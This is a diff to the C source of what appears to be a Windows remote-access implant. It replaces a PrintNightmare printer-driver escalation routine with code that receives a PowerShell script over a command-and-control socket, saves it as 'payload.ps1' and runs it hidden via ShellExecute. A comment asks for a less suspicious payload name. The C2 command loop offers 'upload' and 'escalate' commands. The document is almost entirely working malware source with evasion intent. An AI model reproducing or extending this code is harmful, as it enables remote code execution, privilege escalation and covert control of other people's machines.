@@ -5,11 +5,13 @@
 #include <string.h>
 #include <shlwapi.h>
 #include <winspool.h>
+#include <shellapi.h>
 
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "Advapi32.lib")
 #pragma comment(lib, "Pathcch.lib")
 #pragma comment(lib, "Winspool.lib")
+#pragma comment(lib, "Shell32.lib")
 
 // Configurations
 #define SLEEP 1
@@ -134,39 +136,6 @@ end:
 
 
 
-// Returns list of driver structures
-// print: Whether to print all drivers or not
-DRIVER_INFO_2* getDrivers(BOOL print) {
-	DWORD numBytes;
-	DWORD numDrivers;
-	PBYTE drivers = NULL;
-
-	// Initial call will fail but fill in numBytes so we know how much memory to allocate
-	BOOL res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, 0, &numBytes, &numDrivers);
-
-	// Allocate memory and make the actual call now
-	drivers = (PBYTE) LocalAlloc(0, numBytes);
-	res = EnumPrinterDrivers(NULL, "Windows x64", 2, drivers, numBytes, &numBytes, &numDrivers);
-	if (!res) {
-		printf("[!] Driver enumeration failed\n");
-		exit(1); // TODO handle better
-	}
-
-	if (print) {
-		for (int i = 0; i < numDrivers; i++) {
-			DRIVER_INFO_2 drv = *(DRIVER_INFO_2*)(drivers + i * sizeof(DRIVER_INFO_2));
-			printf("Name   : %s\n", drv.pName);
-			printf("Config : %s\n", drv.pConfigFile);
-			printf("Data   : %s\n", drv.pDataFile);
-			printf("Driver : %s\n", drv.pDriverPath);
-			printf("Version: %u\n", drv.cVersion);
-			printf("\n");
-		}
-	}
-	
-	return (DRIVER_INFO_2*) drivers;
-}
-
 // Checks the registry to see if host is vulnerable to printer nightmare.
 // Returns 1 for vulnerable, 0 for not vulnerable, -1 on error
 DWORD check_registry_for_privesc() {
@@ -211,7 +180,56 @@ DWORD check_registry_for_privesc() {
 }
 
 
+// Creates a file in the present working directory and writes the printer nightmare powershell script to it.
+// Returns NULL on failure, and the path to the script on success.
+// TODO: name the payload something less sus than "payload.ps1"
+char* GetPayload() {
+    char* payload_path;
+    char* payload_data;
+
+    // Allocate buffer for payload path
+    payload_path = HeapAlloc(heap, 0, 2 * MAX_PATH);
+    if (payload_path == NULL) {
+        return NULL;
+    }
+
+    // Allocate buffer for payload data
+    payload_data = HeapAlloc(heap, 0, 250*1000); // Allocate 250 Kb to be safe
+    if (payload_data == NULL) {
+        return NULL;
+    }
+
+    // Create file for payload to be written to
+    strcpy(payload_path, pwd);
+    strcat(payload_path, "\\payload.ps1");
+    HANDLE hFile = CreateFile(payload_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        HeapFree(heap, 0, payload_data);
+        HeapFree(heap, 0, payload_path);
+        return NULL;
+    }
+
+    // Receive payload
+    int len = c2_recv(c2_sock, payload_data, 250*1000);
+    printf("[*] Payload size: %d bytes\n", len);
+
+    // Write paylaod
+    if (! WriteFile(hFile, payload_data, len, NULL, NULL)) {
+        HeapFree(heap, 0, payload_data);
+        HeapFree(heap, 0, payload_path);
+        CloseHandle(hFile);
+        DeleteFile(payload_path);
+        return NULL;
+    }
+
+    CloseHandle(hFile);
+    return payload_path;
+}
+
+
 // Attempts to gain administrator privileges via the Printer Nightmare CVE
+// TODO: I think the issue is that the powershell script is not being formatted properly
+//       when it is being pulled down. Need to investigate.
 DWORD escalate() {
     DWORD FLAGS = APD_COPY_ALL_FILES | 0x10 | 0x8000;
 	CHAR dll_path[MAX_PATH];
@@ -228,32 +246,27 @@ DWORD escalate() {
         // TODO: If there was an error what do we do?
     }
 
-	// Get path to a driver
-	printf("[*] Enumerating drivers...\n");
-	DRIVER_INFO_2* drivers = getDrivers(FALSE);
-	strncpy(driver_path, drivers[0].pDriverPath, MAX_PATH);
-	LocalFree(drivers);
-	printf("[+] Path to driver: %s\n", driver_path);
+    // Download script
+    char* script_path = GetPayload();
+    if (script_path == NULL) {
+        c2_send(c2_sock, "ERROR: Could not download script", 32);
+        HeapFree(heap, 0, script_path);
+        return -1;
+    }
+    printf("Script path: %s\n", script_path);
 
-	// Create driver object
-	DRIVER_INFO_2 payload = {
-		.cVersion = 3,
-		.pDriverPath = driver_path,
-		.pConfigFile = dll_path,
-		.pDataFile = dll_path,
-		.pEnvironment = "Windows x64",
-		.pName = "EvilDriver"
-	};
-
-	// printf("[*] Attempting to add new driver...\n");
-	// DWORD res = AddPrinterDriverEx(NULL, 2, (PBYTE) &payload, FLAGS);
-	// if (!res) {
-	// 	printf("[!] Adding printer driver failed\n");
-	// 	exit(1);
-	// }
-	// printf("[*] Driver added successfully\n");
+    // Execute the powershell script
+    INT_PTR res = (INT_PTR) ShellExecute(NULL, "open", "powershell.exe", script_path, NULL, SW_HIDE);
+    if (res <= 32) {
+        printf("script failed to execute\n");
+    }
+    else {
+        printf("script executed I think");
+    }
 
 
+
+    HeapFree(heap, 0, script_path);
     return 0;
 }
 
@@ -335,10 +348,6 @@ int main() {
 
         else if(strncmp(buffer, "upload ", 6) == 0) {
             // falls more on the c2 server
-        }
-
-        else if(strncmp(buffer, "drivers", 7) == 0) {
-            getDrivers(TRUE);
         }
 
         else if(strncmp(buffer, "escalate", 8) == 0) {
